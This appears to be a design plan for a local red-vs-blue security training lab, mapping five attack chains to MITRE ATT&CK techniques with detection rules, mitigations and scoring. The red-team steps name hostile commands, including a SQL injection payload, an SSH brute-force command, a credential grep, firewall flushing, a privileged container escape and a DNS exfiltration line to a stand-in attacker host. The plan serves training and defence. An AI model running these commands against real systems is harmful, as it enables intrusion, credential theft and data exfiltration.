# Mini-SOC Lab: MITRE ATT&CK-Based Red vs Blue Team Exercise

## Executive Summary
Implementing a 4-stage kill chain with 3-5 attack vectors focusing on malware analysis and reverse engineering. Each vector represents a different entry point but follows a chained attack methodology through the kill chain.

---

## PART 1: MITRE ATT&CK FRAMEWORK MAPPING

### Kill Chain Stages (Blue vs Red Scoring)
```
Stage 1: Reconnaissance + Initial Access (HIGHEST BLUE POINTS)
         ↓
Stage 2: Persistence + Privilege Escalation
         ↓
Stage 3: Lateral Movement + Discovery
         ↓
Stage 4: Exfiltration + Impact (HIGHEST RED POINTS)
```

---

## PART 2: ATTACK VECTORS (3-5 Complete Chains)

### VECTOR 1: Web Application Exploitation Chain
**Entry Point**: HTTP (Port 80) - Vulnerable Web App

**Technique Chain**:
1. **T1592** (Reconnaissance - Gather Victim Org Info)
   - Red Team: `nmap -sV 127.0.0.1 -p 80` → Identify web server version
   - Procedure Example: Service fingerprinting
   
2. **T1190** (Initial Access - Exploit Public-Facing Application)
   - Red Team: SQL Injection → RCE in vulnerable PHP endpoint
   - Payload: `' OR '1'='1`; exec command to download reverse shell
   - Procedure Example: Web app vulnerability exploitation
   
3. **T1053** (Persistence - Scheduled Task/Cron Job)
   - Red Team: Deploy bash script to `/var/spool/cron/crontabs/www-data`
   - Cronjob: `*/5 * * * * /tmp/beacon.sh` (beacon every 5 min)
   - Procedure Example: Cron-based persistence
   
4. **T1548** (Privilege Escalation - Abuse Elevation Control Mechanism)
   - Red Team: Exploit sudo misconfiguration or kernel vulnerability
   - Payload: `sudo -l` enumeration → exploit vulnerable sudoer entry
   
5. **T1020** (Exfiltration - Automated Exfiltration)
   - Red Team: Beacon sends system info + files to attacker C2
   - Data: `/etc/passwd`, application configs, database contents

**Blue Team Detection**:
- Monitor HTTP requests for SQL injection patterns
- Alert on child process spawning from web server (php/apache)
- Monitor cron file modifications
- Detect outbound connections from web server to unknown IPs
- SIEM correlation: HTTP anomaly → Process execution → Network connection

---

### VECTOR 2: SSH Brute Force → Lateral Movement Chain
**Entry Point**: SSH (Port 22) - Weak Credentials

**Technique Chain**:
1. **T1589** (Reconnaissance - Gather Victim Identity Info)
   - Red Team: `ssh-keyscan 127.0.0.1` → Enumerate SSH version
   
2. **T1110** (Initial Access - Brute Force)
   - Red Team: `hydra -l root -P wordlist.txt ssh://127.0.0.1`
   - Common creds: `root:password`, `www-data:www-data`
   - Procedure Example: SSH credential stuffing
   
3. **T1098** (Persistence - Modify SSH Authorized Keys)
   - Red Team: Add attacker public key to `~/.ssh/authorized_keys`
   - Ensures access even if password changes
   
4. **T1552** (Discovery - Unsecured Credentials)
   - Red Team: Find `.env`, database creds, API keys in home directory
   - File scan: `grep -r "password\|API_KEY\|SECRET" /home/*`
   
5. **T1570** (Lateral Movement - Transfer Tools via SSH)
   - Red Team: `scp malware.bin user@127.0.0.1:/tmp/`
   - Prepare for privilege escalation or exfiltration

**Blue Team Detection**:
- Failed SSH login attempts → Alert after 5 failures
- Successful login from unknown IP → Quarantine
- SSH key file modifications → Block
- Process execution from SSH session spawning shell
- Outbound connections from SSH session

---

### VECTOR 3: DNS Poisoning → Malware Delivery Chain
**Entry Point**: DNS (Port 53) - Man-in-the-Middle / DNS Spoofing

**Technique Chain**:
1. **T1590** (Reconnaissance - Gather Network Topology)
   - Red Team: DNS enumeration, zone transfers
   - Command: `dig @127.0.0.1 axfr minisoc.local`
   
2. **T1584** (Initial Access - Compromise Infrastructure - DNS)
   - Red Team: Poison DNS responses to redirect to malicious server
   - Poison response: `minisoc.lab → 192.168.1.100 (attacker server)`
   
3. **T1566** (Initial Access - Phishing with Malware)
   - Red Team: Victim downloads malware from fake domain
   - HTTPS cert spoofing + malicious binary download
   
4. **T1547** (Persistence - Boot or Logon Autostart Execution)
   - Red Team: Modify systemd service or `/etc/init.d/` script
   - Payload: `systemctl enable malware.service` → runs at boot
   
5. **T1041** (Exfiltration - Exfiltrate Over C2 Channel)
   - Red Team: C2 beacon established via DNS tunnel
   - Data exfiltration: `nslookup exfil.attacker.com` (encoded data in subdomain)

**Blue Team Detection**:
- DNS query anomalies (unusual query volume, TXT record transfers)
- DNS response time deviations
- Binary downloads from unusual domains
- Process execution tracking (malware.bin spawn)
- Network traffic baseline deviation

---

### VECTOR 4: Supply Chain / Dependency Injection
**Entry Point**: Application Dependencies / Package Manager

**Technique Chain**:
1. **T1195** (Initial Access - Supply Chain Compromise)
   - Red Team: Inject malicious code into application dependency
   - Example: Compromised `npm` or `pip` package with backdoor
   
2. **T1027** (Obfuscation - Obfuscated Files or Information)
   - Red Team: Hide malware in legitimate-looking library code
   - Minified/compiled code with embedded shell
   
3. **T1036** (Deception - Masquerade as System Component)
   - Red Team: Malware disguised as system update service
   - Process name: `system-updater` (spawning shell internally)
   
4. **T1547** (Persistence - Service Installation)
   - Red Team: Register as system service via compromised package
   - Service: `/etc/systemd/system/update-daemon.service`
   
5. **T1123** (Exfiltration - Audio Capture / Keystroke Logging)
   - Red Team: Keylogger embedded in dependency
   - Send logs back to C2 server periodically

**Blue Team Detection**:
- Package integrity verification (checksums, signatures)
- Process behavior analysis (unexpected child processes)
- System service monitoring (new/modified services)
- Outbound connection tracking from application processes
- File system modifications in system directories

---

### VECTOR 5: Container Escape → Host Compromise
**Entry Point**: Docker Container Vulnerability

**Technique Chain**:
1. **T1610** (Initial Access - Containers at Discovery)
   - Red Team: Scan for exposed Docker daemon or privileged container
   - Command: `docker ps`, `docker inspect`, privilege check
   
2. **T1611** (Privilege Escalation - Escape to Host)
   - Red Team: Exploit container escape vulnerability (cgroup v1, /proc mount)
   - Technique: `docker run --privileged` → mount host filesystem
   
3. **T1053** (Persistence - Cron on Host)
   - Red Team: Write cron job to host filesystem via escape
   - Path: `/mnt/host/var/spool/cron/crontabs/root`
   
4. **T1562** (Defense Evasion - Disable or Modify System Firewall)
   - Red Team: Disable iptables rules from host context
   - Command: `iptables -F` (flush rules)
   
5. **T1041** (Exfiltration - Data over C2)
   - Red Team: Access host system files, send to attacker
   - Data: Docker secrets, host configs, user data

**Blue Team Detection**:
- Docker daemon access attempts
- Privilege escalation syscalls (unshare, clone with CLONE_NEWUSER)
- Cgroup v1 access patterns
- Host filesystem access from container
- Suspicious process spawning from Docker process
- Firewall rule modifications

---

## PART 3: DETECTION & MITIGATION MAPPING

### Detection Strategy Template (per vector)

**VECTOR 1: Web App Exploitation**
```
Detection Rule DET-001: SQL Injection Pattern
- Monitor HTTP request parameters for SQL keywords
- Alert on: ' OR ', UNION SELECT, DROP TABLE, exec(
- Correlation: HTTP alert + PHP process execution
- Threshold: 3+ alerts in 60 seconds

Detection Rule DET-002: Cronjob Modification
- File integrity monitoring on /var/spool/cron/
- Alert: New cron files or modifications
- Check: Cronjob syntax validity, execution targets

Detection Rule DET-003: Unauthorized Outbound Connection
- Baseline network flow: web server should NOT make outbound connections
- Alert on: Any TCP/UDP from web server to external IPs (except DNS)
- Severity: HIGH if destination is unrecognized, port 443/8080
```

**VECTOR 2: SSH Brute Force**
```
Detection Rule DET-004: Failed SSH Login Threshold
- Monitor /var/log/auth.log
- Alert after: 5 failed attempts in 60 seconds
- Auto-response: Rate limit / IP block

Detection Rule DET-005: SSH Key Injection
- Monitor ~/.ssh/authorized_keys modifications
- Alert: New keys added
- Verify: Key fingerprint against known hosts

Detection Rule DET-006: SSH Lateral Movement
- Track processes spawned from SSH session (sshd child)
- Alert on: bash, sh, nc, wget from SSH context
- Correlate: SSH login time + process execution time
```

**VECTOR 3: DNS Poisoning**
```
Detection Rule DET-007: DNS Query Anomaly
- Baseline: Legitimate DNS queries (frequency, types)
- Alert on: Zone transfer attempts, unusual query volume
- Threshold: 100+ DNS queries from single client in 5 min

Detection Rule DET-008: Binary Download
- Monitor HTTP/HTTPS downloads to /tmp, /var/tmp
- Alert on: Executable files (.bin, .elf, .out)
- Check: File type mismatch (e.g., .png is actually binary)

Detection Rule DET-009: Service Installation
- Monitor systemd service creation/modification
- Alert: New services in /etc/systemd/system/
- Verify: Service file source and execution path
```

**VECTOR 4: Supply Chain**
```
Detection Rule DET-010: Package Integrity
- Verify package checksums during installation
- Alert: Checksum mismatch
- Monitor: Unexpected binary execution after package update

Detection Rule DET-011: Unusual Process Behavior
- Baseline: Expected process tree for each application
- Alert on: Unexpected child processes (e.g., app spawning shell)
- Pattern match: Process name + execution context
```

**VECTOR 5: Container Escape**
```
Detection Rule DET-012: Docker Daemon Access
- Monitor: Docker API calls from containers
- Alert on: docker.sock access, privileged container creation
- Verify: Container privilege level

Detection Rule DET-013: Cgroup Access
- Monitor: /sys/fs/cgroup/ access from containers
- Alert: Cgroup v1 write operations
- Detect: Container escape patterns

Detection Rule DET-014: Host Filesystem Mount
- Monitor: Container mount operations
- Alert: Binding /proc, /, /sys from container
- Correlate: Mount operation + privilege escalation syscalls
```

---

## PART 4: MITIGATION STRATEGIES

### General Mitigations (M-series MITRE)

**M1047 - Audit**: Regular security audits of configurations
- Implement: Weekly SSH config review, dependency audit
- Tool: `lynis`, `owasp-dependency-check`

**M1056 - Pre-compromise**: Minimize exposed data
- Implement: Hide service versions, disable banner grabbing
- Tool: Web server config hardening, SSH version obscuring

**M1018 - User Account Management**: Enforce strong password policies
- Implement: SSH key-only auth, remove default accounts
- Tool: PAM modules, SSH config (PasswordAuthentication=no)

**M1026 - Privileged Account Management**: Limit privilege escalation
- Implement: Principle of least privilege, sudoers restrictions
- Tool: `visudo` hardening, remove dangerous sudo entries

**M1040 - Behavior Prevention on Endpoint**: Monitor and block anomalous behavior
- Implement: HIDS (Wazuh), process execution policy
- Tool: Falco, auditd

**M1031 - Network Segmentation**: Isolate critical systems
- Implement: Firewall rules, network policies
- Tool: iptables, Docker network isolation

---

## PART 5: SCORING SYSTEM

### Point Distribution

```
STAGE 1: INITIAL ACCESS (Blue = 150 pts max, Red = 50 pts max)
├─ Blue Stops SQL Injection: +150 pts (Highest)
├─ Blue Stops SSH Brute Force: +150 pts
├─ Blue Stops DNS Poisoning: +150 pts
├─ Blue Stops Supply Chain: +150 pts
├─ Blue Stops Container Escape: +150 pts
└─ Red Gains Initial Access: +50 pts (Persistence not established)

STAGE 2: PERSISTENCE (Blue = 100 pts max, Red = 75 pts max)
├─ Blue Detects Cron/Service: +100 pts
├─ Blue Detects SSH Key Injection: +100 pts
├─ Blue Removes Persistence: +100 pts
└─ Red Establishes Persistence: +75 pts (survives reboot)

STAGE 3: PRIVILEGE ESCALATION (Blue = 75 pts max, Red = 100 pts max)
├─ Blue Detects Priv Esc Attempt: +75 pts
├─ Blue Stops Container Escape: +75 pts
└─ Red Achieves Root/Admin: +100 pts (lateral movement unlocked)

STAGE 4: EXFILTRATION (Blue = 50 pts max, Red = 200 pts max)
├─ Blue Detects Data Exfiltration: +50 pts
├─ Blue Blocks Outbound Traffic: +50 pts
├─ Red Exfiltrates Critical Data: +200 pts (Highest)
├─ Red Exfiltrates Partial Data: +150 pts
└─ Red Exfiltrates Metadata: +100 pts

TIME BONUS (Optional)
├─ Red Completes Chain < 5 min: +50 pts
├─ Blue Detects < 2 min: +25 pts
└─ Red Evades > 30 min: +100 pts (evasion bonus)
```

### Cumulative Scoring Example

**Red Team Wins (Successful Exfiltration)**:
- Initial Access: +50
- Persistence: +75
- Privilege Escalation: +100
- Exfiltration: +200
- Time Bonus: +50
- **Total: 475 pts**

**Blue Team Wins (Stops at Persistence)**:
- Detects SQL Injection: +150
- Detects Cron Persistence: +100
- Blocks Outbound: +50
- **Total: 300 pts**

---

## PART 6: TECHNICAL ARCHITECTURE

### Vulnerable Endpoints (Victim Container)

| Port | Service | Vulnerability | Purpose |
|------|---------|----------------|---------|
| 80   | Apache + PHP App | SQL Injection in login form | Web App exploitation |
| 22   | SSH | Weak default credentials, sudoers misconfig | Brute force + priv esc |
| 53   | dnsmasq | DNS query logging (no DNSSEC) | DNS poisoning detection |
| 3306 | MySQL (optional) | Default credentials | Database access after RCE |
| 9200 | Elasticsearch (optional) | No auth, open indexing | Data exfiltration target |

### Victim VM File Structure
```
/home/attacker/
  ├── .ssh/authorized_keys (writable, weak perms)
  ├── .env (database creds exposed)
  └── sensitive_data/ (exfiltration target)

/var/www/html/
  ├── index.php (SQL injection in login)
  ├── admin.php (authenticated RCE)
  └── config.php (database credentials)

/var/spool/cron/crontabs/ (writable by www-data)
/tmp/ (writable, /tmp files executable)
/etc/sudoers (misconfigured, www-data can run certain commands)
```

### Blue Team Detection Components (Backend)

1. **Real-time Log Aggregation**
   - Collect: /var/log/auth.log, /var/log/apache2/access.log, auditd logs
   - Forward to: Wazuh/ELK stack
   - Latency: < 5 seconds

2. **Anomaly Detection Engine**
   - Baseline: First 24 hours of normal traffic
   - Detection: Deviation from baseline (behavioral analysis)
   - Alerts: Process execution, network flows, file modifications

3. **Correlation Rules**
   - Multi-factor alerts: SQL injection + child process + outbound connection
   - Severity scoring: Single alert = LOW, Triple alert = CRITICAL

4. **Response Actions**
   - Auto-quarantine: Kill process, block IP, isolate container
   - Manual override: Blue team operator can approve/deny

---

## PART 7: FRONTEND COMPONENTS (Mini-SOC Lab)

### Blue Team Dashboard (/blue)
- **AlertsPanel**: Real-time detection alerts with severity (DET-001, DET-002, etc.)
- **LiveLog**: Attack timeline showing red team actions vs blue team detections
- **NetworkMonitor**: Visualize suspicious connections, data flows
- **OperatorTerminal**: Manual response commands (block IP, kill process)

### Red Team Console (/red)
- **ActionPanel**: Available attacks at current stage
- **GameOverModal**: Victory/defeat screen with score breakdown
- **MissionControl**: Task progress tracker

### Scoring Display
- **StatCard**: Real-time points (Blue vs Red)
- **Kill Chain Progress**: Visual representation of attack stage reached

---

## PART 8: TIMELINE & MILESTONES

**Week 1**: Infrastructure setup
**Week 2**: Attack vector implementation
**Week 3**: Blue team detection + response
**Week 4**: Integration & testing
**Week 5**: Scoring system + UI

---

## PART 9: SUCCESS CRITERIA

✅ 3-5 complete attack vectors implemented
✅ Each vector chains 3-5 MITRE techniques
✅ Detection rules prevent/detect each technique
✅ Scoring system rewards appropriate stage completion
✅ Real-time visualization of attack vs defense
✅ Automated malware analysis integration (existing MalwareWorkbench component)
✅ Blue team can perform manual remediation actions

